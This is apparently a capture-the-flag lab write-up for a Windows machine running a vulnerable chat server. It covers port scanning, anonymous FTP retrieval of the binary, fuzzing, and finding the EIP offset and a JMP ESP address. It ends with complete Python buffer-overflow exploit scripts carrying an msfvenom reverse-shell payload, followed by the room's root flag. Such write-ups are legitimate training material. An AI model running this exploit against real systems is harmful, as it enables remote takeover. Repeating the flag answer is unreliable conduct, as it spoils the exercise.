# Brainstorm

> Reverse engineer a chat program and write a script to exploit a Windows machine.

<br>

### Process:

1. port scan:
	- `sudo nmap -T4 -p- 10.10.16.64 -Pn`
	- `sudo nmap -T4 -A -p 21,9999 10.10.16.64 -Pn`
2. enumerate FTP:
	- anonymous login allowed
	- login: `ftp 10.10.16.64` -> "anonymous"
	- found "chatserver.exe" and "essfunc.dll"
	- download in binary mode to prevent corruption
		- `binary` -> `mget chaserver.exe` -> `mget essfunc.dll`
3. enumerate "abyss" service at TCP 9999:
	- connect with netcat: `nc -v 10.10.16.64 9999`
	- appears to be a chat app saying to enter a username (max 20 characters)
4. try to buffer overflow the downloaded app
	- find EIP offset:
		- open Windows 32-bit VM and transfer files across
		- open Immunity Debugger and run chatserver.exe
		- edit fuzzer.py script to include "user" before payload:
		```python
		#!/usr/bin/env python3
		import socket, time, sys

		ip = "10.0.1.6"
		port = 9999
		timeout = 5
		prefix = ""
		user = "user1 \r\n"								# EDITED

		string =  "A" * 100 + prefix 

		while True:
		  try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			  s.settimeout(timeout)
			  s.connect((ip, port))
			  s.recv(1024)
			  print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
			  s.recv(1024)
			  s.send(bytes(user, "latin-1"))			# EDITED
			  s.send(bytes(string, "latin-1"))
			  s.recv(1024)
		  except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		  string += 100 * "A"
		  time.sleep(1)
		 ```
		- run fuzzer.py -- crashed program at 2200 bytes
		- generate cyclic payload to determine offset: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200`
		- edit exploit.py to included cyclic payload and user: 
		```python
		#!/usr/bin/env python3
		import socket

		ip = "10.0.1.6"
		port = 9999

		prefix = ""
		offset = 0
		overflow = "A" * offset
		retn = ""
		padding = ""
		user = "user1 \r\n"								# EDITED
		payload = "<cyclic_pattern>"
		postfix = ""

		buffer = prefix + overflow + retn + padding + payload + postfix

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
		  s.connect((ip, port))
		  print("Sending evil buffer...")
		  s.send(bytes(user, "latin-1"))				# EDITED
		  s.recv(1024)									# EDITED
		  s.send(bytes(buffer, "latin-1"))
		  print("Done!")
		except:
		  print("Could not connect.")
		```
		- restart Immunity with chat app and run exploit.py
		- when program crashes run (in Immunity): `!mona findmsp -distance 2200` to find EIP offset
		- EIP offset = 2012
	- find a jump point:
		- in Immunity: `!mona jmp -r esp -cpb \x00`
		- found: 625014DF (in essfunc.dll) with no protections
	- generate shellcode:
		- `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.5 LPORT=1234 EXITFUNC=thread -b "\x00" -f c`
	- edit exploit.py:
	```python
	#!/usr/bin/env python3
	import socket

	ip = "10.0.1.6"
	port = 9999

	prefix = ""
	offset = 2012									# EDITED
	overflow = "A" * offset
	retn = "\xdf\x14\x50\x62"						# EDITED
	padding = "\x90" * 16							# EDITED
	user = "user1 \r\n"								 
	payload = "<msfvenom_payload>"					# EDITED
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
	  s.connect((ip, port))
	  print("Sending evil buffer...")
	  s.send(bytes(user, "latin-1"))				
	  s.recv(1024)									
	  s.send(bytes(buffer, "latin-1"))
	  print("Done!")
	except:
	  print("Could not connect.")
	```
	- setup listener (`nc -lvnp 1234`) and run exploit.py -- success
5. buffer overflow the real app:
	- edit exploit.py to inlude real IP address and a new msfvenom payload
	- setup listener (`nc -lvnp 1234`) and run exploit.py -- success
6. get root.txt flag:
	- `cd \users\drake\desktop` -> `type root.txt`
	- root flag = **5b1001de5a44eca47eee71e7942a8f8a**








